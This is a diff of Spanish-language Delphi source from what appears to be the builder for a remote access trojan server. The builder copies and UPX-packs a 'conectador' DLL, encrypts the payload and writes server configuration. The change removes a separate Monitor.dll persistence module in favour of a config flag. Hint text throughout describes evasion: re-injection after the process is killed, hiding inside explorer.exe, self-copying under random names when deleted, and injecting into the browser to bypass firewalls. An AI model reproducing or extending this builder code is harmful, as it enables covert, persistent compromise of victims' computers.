@@ -307,20 +307,6 @@ begin
       end;
       MemoOutput.Lines.Append('> Jeringa.exe correctamente copiado.');
 
-      if(CheckBoxPersistencia.Checked) then
-      begin
-        if(fileexists(extractfiledir(paramstr(0))+'\Recursos\Monitor.dll')) then
-          CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\Monitor.dll'), pchar(extractfiledir(paramstr(0))+'\~monitor.dll'),false)
-        else
-        begin
-          FinalizarInstalacion(false);
-          StatusBar.Panels[0].Text := 'El archivo Monitor.dll no existe.';
-          MemoOutput.Lines.Append('> Error: El archivo Monitor.dll no existe.');
-          exit;
-        end;
-          MemoOutput.Lines.Append('> Monitor.dll correctamente copiado.');
-      end;
-
       if(fileexists(extractfiledir(paramstr(0))+'\Recursos\conectador.dll')) then
           CopyFile(pchar(extractfiledir(paramstr(0))+'\Recursos\conectador.dll'), pchar(extractfiledir(paramstr(0))+'\~conectador.dll'),false)
       else
@@ -334,21 +320,15 @@ begin
 
       if(CheckBoxUPX.Checked) then
       begin
-        MemoOutput.Lines.Append('Comprimiendo conectador.dll y monitor.dll con UPX...');
+        MemoOutput.Lines.Append('Comprimiendo conectador.dll con UPX...');
         FillChar(StartInfo, SizeOf(StartInfo), 0);
         StartInfo.cb := SizeOf(StartInfo);
 
         CreateProcess(PChar(extractfiledir(paramstr(0))+'\Recursos\upx.exe'), pchar(' '+extractfiledir(paramstr(0))+'\~conectador.dll'), nil, nil, false, 0,nil, nil, StartInfo, ProcInfo);
         WaitForSingleObject(ProcInfo.hProcess, INFINITE);  //Esperamos a que acabe
-        if (checkboxpersistencia.Checked) then
-        begin
-          CreateProcess(PChar(extractfiledir(paramstr(0))+'\Recursos\upx.exe'), pchar(' '+extractfiledir(paramstr(0))+'\~monitor.dll'), nil, nil, false, 0,nil, nil, StartInfo, ProcInfo);
-          WaitForSingleObject(ProcInfo.hProcess, INFINITE);  //Esperamos a que acabe
-        end;
         MemoOutput.Lines.Append('Comprimidos!');
       end;
-      if checkboxpersistencia.Checked then
-        monitor    := cifrar(cifrar(leerarchivo(extractfiledir(paramstr(0))+'\~monitor.dll'),num),num2);
+
       conectador := cifrar(cifrar(leerarchivo(extractfiledir(paramstr(0))+'\~conectador.dll'),num),num2);
 
     end
@@ -368,10 +348,8 @@ begin
 
     if(checkboxinyectar.Checked) then
     begin
-      if checkboxpersistencia.Checked then
-        MemoOutput.Lines.Append('> Monitor.dll (Persistencia) añadida => +('+inttostr(length(monitor))+')');
       MemoOutput.Lines.Append('> Conectador.dll añadida => +('+inttostr(length(conectador))+')');
-    MemoOutput.Lines.Append('> Escribiendo la configuración al servidor...');
+      MemoOutput.Lines.Append('> Escribiendo la configuración al servidor...');
     end
     else
     MemoOutput.Lines.Append('> Escribiendo la configuración al servidor...');
@@ -393,7 +371,8 @@ begin
     ConfigToSave.bArranqueActiveSetup := CheckBoxActiveSetup.Checked;
     ConfigToSave.snumerocifrado := inttostr(num);
     ConfigToSave.snumerocifrado2 := inttostr(num2);
-    if WriteSettings(PChar(Servidor), ConfigToSave, monitor,conectador) = True then
+    ConfigToSave.bPersistencia := CheckboxPersistencia.Checked;
+    if WriteSettings(PChar(Servidor), ConfigToSave, conectador) = True then
     begin
       StatusBar.Panels[0].Text := 'La configuración se guardó con éxito.';
       MemoOutput.Lines.Append('> La configuración se guardó con éxito.');
@@ -488,10 +467,9 @@ begin
     'de modificación.';
   CheckBoxCopiarConFechaAnterior.Hint := s;
 
-  s := 'Cuando el proceso servidor sea matado volvera a iniciarse e inyectarse' + #13#10 +
+  s := 'Cuando el proceso servidor sea matado volvera a iniciarse e inyectarse' {+ #13#10 +
     'Si es matado más de tres veces se inyectara en explorer.exe para no ser tan visible' + #13#10+
-    'Si el archivo donde se instala es borrado volverá a copiarse en otro directorio con un nombre aleatorio'+#1310+
-    'Atención: Activar esta opción incrementa el tamaño del servidor';
+    'Si el archivo donde se instala es borrado volverá a copiarse en otro directorio con un nombre aleatorio'};
   CheckBoxPersistencia.Hint := s;
 
     s := 'El servidor se inyectará en el navegador predeterminado para saltarse firewalls' + #13#10 +
